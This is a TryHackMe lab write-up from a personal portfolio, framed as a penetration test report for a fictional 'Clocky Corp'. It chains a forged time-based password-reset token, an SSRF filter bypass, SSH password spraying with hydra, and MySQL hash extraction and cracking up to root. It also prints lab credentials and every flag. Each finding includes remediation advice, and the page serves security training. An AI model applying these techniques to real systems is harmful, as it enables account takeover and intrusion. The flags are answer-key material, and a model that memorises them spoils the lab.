@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A penetration test was conducted against the target environment at 10.66.183.44. The assessment identified six security vulnerabilities that, when chained, allo">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-medium">Medium</span> <span class="dot">·</span> <span class="date">May 31, 2026</span></p>
+<div class="writeup-content">
+<p><strong>Client:</strong> Clocky Corp   <strong>Assessment Date:</strong> May 31, 2026   <strong>Classification:</strong> CONFIDENTIAL  </p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>A penetration test was conducted against the target environment at 10.66.183.44. The assessment identified six security vulnerabilities that, when chained, allowed an unauthenticated attacker to achieve full remote compromise of the host as root. Initial access was gained by exploiting a predictable password reset token generation algorithm using time-based SHA1 token forgery. Administrative dashboard access revealed a Server-Side Request Forgery (SSRF) vulnerability that allowed exfiltration of a database backup file containing cleartext credentials. Reused credentials provided SSH access, and privilege escalation was achieved by cracking MySQL authentication hashes recovered from the database, yielding root-level access.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>10.66.183.44</td>
+</tr>
+<tr>
+<td>Ports in Scope</td>
+<td>22, 80, 8000, 8080</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>Apache 2.4.41, nginx 1.18.0, Flask/Werkzeug 2.2.3, MySQL 8.0</td>
+</tr>
+<tr>
+<td>Assessment Type</td>
+<td>External penetration test</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>3. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>Sensitive Information Disclosure in robots.txt</td>
+<td>5.3</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>Sensitive Backup File (index.zip) Exposed on nginx</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Predictable Password Reset Token Generation</td>
+<td>9.8</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Server-Side Request Forgery (SSRF) in Admin Dashboard</td>
+<td>8.8</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>Hardcoded Credentials in Database Backup</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-06</td>
+<td>MySQL Password Hash Cracking Leading to Privilege Escalation</td>
+<td>8.0</td>
+<td>High</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>4. Detailed Findings</h2>
+<h3>F-01: Sensitive Information Disclosure in robots.txt</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 5.3)   <strong>Affected Component:</strong> <code>http://10.66.183.44:8000/robots.txt</code></p>
+<p><strong>Description:</strong>   The nginx web server on port 8000 exposes a <code>robots.txt</code> file that disallows crawlers from accessing files with <code>.sql</code>, <code>.zip</code>, and <code>.bak</code> extensions. This disclosure reveals the existence of sensitive file types on the server, guiding an attacker toward high-value targets. Additionally, the first flag was discovered directly within the <code>robots.txt</code> content.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>GET /robots.txt HTTP/1.1
+Host: 10.66.183.44:8000</code></pre>
+<p>Response contains:</p>
+<pre><code>User-agent: *
+Disallow: /*.sql$
+Disallow: /*.zip$
+Disallow: /*.bak$
+
+Flag 1: THM{14b45bb9eefdb584b79063eca6a31b7a}</code></pre>
+<p><strong>Impact:</strong> An attacker learns which file types may contain sensitive data and gains an initial foothold flag.</p>
+<p><strong>Recommendation:</strong> Remove flags and internal information from <code>robots.txt</code>. Restrict access to sensitive file types via proper access controls rather than relying on robots exclusion.</p>
+<hr>
+<h3>F-02: Sensitive Backup File Exposed on nginx</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5)   <strong>Affected Component:</strong> <code>http://10.66.183.44:8000/index.zip</code></p>
+<p><strong>Description:</strong>   A ZIP archive named <code>index.zip</code> is publicly accessible on the nginx server. This archive contains the full application source code (<code>app.py</code>) and a flag file. The source code reveals the application's internal logic, including the password reset token generation algorithm, database connection parameters, usernames, and a debug-enabled Flask application.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>$ wget http://10.66.183.44:8000/index.zip
+$ unzip index.zip
+  inflating: app.py
+  extracting: flag2.txt
+
+$ cat flag2.txt
+THM{1d3d62de34a3692518d03ec474159eaf}</code></pre>
+<p><strong>Impact:</strong> Full application source code disclosure allows an attacker to identify and exploit multiple vulnerabilities including the password reset token flaw and SSRF.</p>
+<p><strong>Recommendation:</strong> Remove backup and source archives from the web root. Implement directory-level access controls for sensitive file extensions.</p>
+<hr>
+<h3>F-03: Predictable Password Reset Token Generation</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.8)   <strong>Affected Component:</strong> <code>/forgot_password</code> and <code>/password_reset</code> — Flask endpoints on port 8080</p>
+<p><strong>Description:</strong>   The password reset mechanism generates a token by concatenating the current server timestamp with the username and hashing the result with SHA1:</p>
+<pre><code>value = datetime.datetime.now()
+lnk = str(value)[:-4] + &quot; . &quot; + username.upper()
+lnk = hashlib.sha1(lnk.encode(&quot;utf-8&quot;)).hexdigest()</code></pre>
+<p>The timestamp is readable from the homepage (<code>The current time is ...</code>). The only unknown is the millisecond value (00–99), requiring a trivial brute-force of 100 possibilities. The username "administrator" was identified in the source code.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Trigger password reset for "administrator":</li>
+<pre><code>POST /forgot_password HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=administrator</code></pre>
+</ol>
+<ol>
+<li>Extract server time from homepage response.</li>
+</ol>
+<ol>
+<li>Generate 100 tokens (milliseconds 00–99):</li>
+<pre><code>for ms in range(100):
+    lnk = f&quot;{timestamp}.{ms:02d} . ADMINISTRATOR&quot;
+    token = hashlib.sha1(lnk.encode()).hexdigest()</code></pre>
+</ol>
+<ol>
+<li>Brute-force the correct token via:</li>
+<pre><code>GET /password_reset?token=&lt;TOKEN&gt; HTTP/1.1</code></pre>
+</ol>
+<ol>
+<li>Set a new password via POST to <code>/password_reset</code>:</li>
+<pre><code>POST /password_reset HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+password=P@ssw0rd123&amp;token=&lt;VALID_TOKEN&gt;</code></pre>
+</ol>
+<p><strong>Impact:</strong> An unauthenticated attacker can reset any known user's password and gain authenticated access to the administrative dashboard, exposing further attack surface.</p>
+<p><strong>Recommendation:</strong> Use cryptographically secure random token generation (e.g., <code>secrets.token_urlsafe()</code>). Never base tokens on predictable values like timestamps. Implement rate limiting on the password reset endpoint.</p>
+<hr>
+<h3>F-04: Server-Side Request Forgery (SSRF) in Admin Dashboard</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.8)   <strong>Affected Component:</strong> <code>/dashboard</code> — <code>POST location</code> parameter</p>
+<p><strong>Description:</strong>   The administrative dashboard provides a "Location" field that instructs the server to fetch a URL. The application filters requests containing <code>localhost</code>, <code>127</code>, and <code>0.0.0.0</code> but can be bypassed using case variations (<code>Localhost</code>). This allows the attacker to make requests to internal services, including the Apache web server on port 80 which is otherwise inaccessible.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<p>Bypass the localhost filter and retrieve <code>database.sql</code>:</p>
+<pre><code>POST /dashboard HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+location=http://Localhost:80/database.sql</code></pre>
+<p>Response contains:</p>
+<pre><code>Flag 4: THM{350020dc1a53e50e1e92bac2c35dd0a2}
+
+CREATE DATABASE IF NOT EXISTS clocky;
+[...]
+INSERT INTO passwords (password) VALUES (&quot;Th1s_1s_4_v3ry_s3cur3_p4ssw0rd&quot;);</code></pre>
+<p><strong>Impact:</strong> An authenticated attacker can enumerate internal services, read sensitive files from internal web servers, and exfiltrate database credentials.</p>
+<p><strong>Recommendation:</strong> Implement a strict allowlist of permitted URLs. Use a URL parser to normalize and validate the target host. Block all RFC 1918 addresses and hostname variations that resolve to localhost.</p>
+<hr>
+<h3>F-05: Hardcoded Credentials in Database Backup</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5)   <strong>Affected Component:</strong> <code>/var/www/html/database.sql</code></p>
+<p><strong>Description:</strong>   A database initialization script stored in the Apache web root contains cleartext credentials. The password <code>Th1s_1s_4_v3ry_s3cur3_p4ssw0rd</code> was found to be reused for the <code>clarice</code> user account on the SSH service.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>$ hydra -L users.txt -p &quot;Th1s_1s_4_v3ry_s3cur3_p4ssw0rd&quot; ssh://10.66.183.44
+[STATUS] 16.67 tries/min
+[22][ssh] host: 10.66.183.44   login: clarice   password: Th1s_1s_4_v3ry_s3cur3_p4ssw0rd
+
+$ ssh clarice@10.66.183.44
+clarice@ip-10-66-183-44:~$ cat flag5.txt
+THM{e57dfa35e62d518cfd215dd7729d0877}</code></pre>
+<p><strong>Impact:</strong> SSH access as user <code>clarice</code> providing a foothold on the internal host and access to the user's flag.</p>
+<p><strong>Recommendation:</strong> Store database initialization scripts outside the web root. Never reuse passwords across database and system accounts. Enforce unique passwords for every service and user.</p>
+<hr>
+<h3>F-06: MySQL Password Hash Cracking Leading to Privilege Escalation</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.0)   <strong>Affected Component:</strong> MySQL <code>mysql.user</code> table</p>
+<p><strong>Description:</strong>   The MySQL database is accessible with credentials discovered in <code>/home/clarice/app/.env</code> (<code>clocky_user:seG3mY4F3tKCJ1Yj</code>). This user has <code>ALL PRIVILEGES ON *.*</code> including access to the <code>mysql.user</code> table containing authentication hashes. The <code>caching_sha2_password</code> hashes can be extracted and converted to a hashcat-compatible format for cracking. The password <code>armadillo</code> was recovered for the <code>dev</code> MySQL user and reused for the <code>root</code> system account.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<ol>
+<li>Connect to MySQL:</li>
+<pre><code>$ mysql -u clocky_user -pseG3mY4F3tKCJ1Yj</code></pre>
+</ol>
+<ol>
+<li>Extract hashes in hashcat-compatible format:</li>
+<pre><code>SELECT CONCAT(&#x27;$mysql&#x27;,
+  LEFT(authentication_string,6),
+  &#x27;*&#x27;,
+  INSERT(HEX(SUBSTR(authentication_string,8)),41,0,&#x27;*&#x27;)
+) AS hash
+FROM mysql.user
+WHERE plugin = &#x27;caching_sha2_password&#x27;
+  AND authentication_string NOT LIKE &#x27;%INVALIDSALTANDPASSWORD%&#x27;
+  AND authentication_string != &#x27;&#x27;;</code></pre>
+</ol>
+<ol>
+<li>Crack with hashcat:</li>
+<pre><code>$ hashcat -m 7401 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+$mysql$A$005*...*...:armadillo</code></pre>
+</ol>
+<ol>
+<li>Escalate to root:</li>
+<pre><code>clarice@ip-10-66-183-44:~$ su - root
+Password: armadillo
+root@ip-10-66-183-44:~# cat /root/flag6.txt
+THM{6ad86ac1463ea8afbe0edd6cdd708f36}</code></pre>
+</ol>
+<p><strong>Impact:</strong> Full root compromise of the target host. Attacker gains unrestricted access to all system resources.</p>
+<p><strong>Recommendation:</strong> </p>
+<ul>
+<li>Grant MySQL users least privilege (no wildcard grants on <code>*.*</code>)</li>
+<li>Use strong, unique passwords for all MySQL accounts</li>
+<li>Do not reuse MySQL credentials for system accounts</li>
+<li>Store environment variables securely with proper file permissions</li>
+<li>Upgrade to MySQL 8.0+ with proper <code>random_password</code> or auth plugins</li>
+</ul>
+<hr>
+<h2>5. Attack Chain Summary</h2>
+<pre><code>Port scan (nmap) — Ports 22, 80, 8000, 8080 open
+    │
+    ▼
+Port 8000/robots.txt — Flag 1 discovered, disallowed file types revealed (.sql, .zip, .bak)
+    │
+    ▼
+Port 8000/index.zip — Source code disclosure (app.py + Flag 2)
+    │
+    ▼
+Code review — Identified predictable SHA1 token generation using server timestamp
+    │
+    ▼
+Port 8080 — Requested password reset for &quot;administrator&quot;, extracted server time
+    │
+    ▼
+Brute-forced 100 token candidates (00–99ms) — Valid SHA1 token found
+    │
+    ▼
+Reset administrator password → Login to admin dashboard → Flag 3
+    │
+    ▼
+SSRF via dashboard &quot;Location&quot; field — Bypassed localhost filter with &quot;Localhost&quot;
+    │
+    ▼
+Retrieved database.sql from Apache (port 80) — Flag 4 + cleartext credentials
+    │
+    ▼
+SSH as clarice with reused database password — Flag 5
+    │
+    ▼
+MySQL connect with clarice&#x27;s .env credentials — Extracted password hashes (hashcat mode 7401)
+    │
+    ▼
+Cracked &quot;dev&quot; MySQL user hash → Reused password &quot;armadillo&quot; for root
+    │
+    ▼
+su - root — /root/flag6.txt captured (THM{...})</code></pre>
+<hr>
+<h2>6. Remediation Priority</h2>
+<table>
+<thead><tr>
+<th>Order</th>
+<th>Finding</th>
+<th>Action</th>
+</tr></thead><tbody>
+<tr>
+<td>1</td>
+<td>F-03</td>
+<td>Replace predictable token generation with cryptographically secure random tokens</td>
+</tr>
+<tr>
+<td>2</td>
+<td>F-04</td>
+<td>Implement URL allowlisting and proper input validation for SSRF endpoint</td>
+</tr>
+<tr>
+<td>3</td>
+<td>F-06</td>
+<td>Revoke wildcard MySQL privileges; enforce strong unique passwords; crack all hashes</td>
+</tr>
+<tr>
+<td>4</td>
+<td>F-05</td>
+<td>Remove database backup from web root; stop password reuse across accounts</td>
+</tr>
+<tr>
+<td>5</td>
+<td>F-02</td>
+<td>Remove source code archives from web root; restrict .zip/.sql/.bak access</td>
+</tr>
+<tr>
+<td>6</td>
+<td>F-01</td>
+<td>Remove flags and internal data from robots.txt</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>7. Appendix: Compromised Credentials</h2>
+<p>The following credentials were compromised during testing and must be rotated immediately:</p>
+<table>
+<thead><tr>
+<th>Account</th>
+<th>Type</th>
+<th>Credential</th>
+</tr></thead><tbody>
+<tr>
+<td>administrator</td>
+<td>Web Application (Flask)</td>
+<td>Reset during test (<code>P@ssw0rd123</code>)</td>
+</tr>
+<tr>
+<td>clarice</td>
+<td>SSH (Linux)</td>
+<td><code>Th1s_1s_4_v3ry_s3cur3_p4ssw0rd</code></td>
+</tr>
+<tr>
+<td>clocky_user</td>
+<td>MySQL</td>
+<td><code>seG3mY4F3tKCJ1Yj</code></td>
+</tr>
+<tr>
+<td>dev</td>
+<td>MySQL</td>
+<td><code>armadillo</code></td>
+</tr>
+<tr>
+<td>root</td>
+<td>Linux (via su)</td>
+<td><code>armadillo</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2>8. Flags Recovered</h2>
+<table>
+<thead><tr>
+<th>Flag</th>
+<th>Value</th>
+</tr></thead><tbody>
+<tr>
+<td>Flag 1 (robots.txt)</td>
+<td><code>THM{14b45bb9eefdb584b79063eca6a31b7a}</code></td>
+</tr>
+<tr>
+<td>Flag 2 (index.zip)</td>
+<td><code>THM{1d3d62de34a3692518d03ec474159eaf}</code></td>
+</tr>
+<tr>
+<td>Flag 3 (Admin Dashboard)</td>
+<td><code>THM{ee68e42f755f6ebbcd89439432d7b462}</code></td>
+</tr>
+<tr>
+<td>Flag 4 (database.sql)</td>
+<td><code>THM{350020dc1a53e50e1e92bac2c35dd0a2}</code></td>
+</tr>
+<tr>
+<td>Flag 5 (clarice home)</td>
+<td><code>THM{e57dfa35e62d518cfd215dd7729d0877}</code></td>
+</tr>
+<tr>
+<td>Flag 6 (/root/flag6.txt)</td>
+<td><code>THM{6ad86ac1463ea8afbe0edd6cdd708f36}</code></td>
+</tr>
+</tbody></table>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
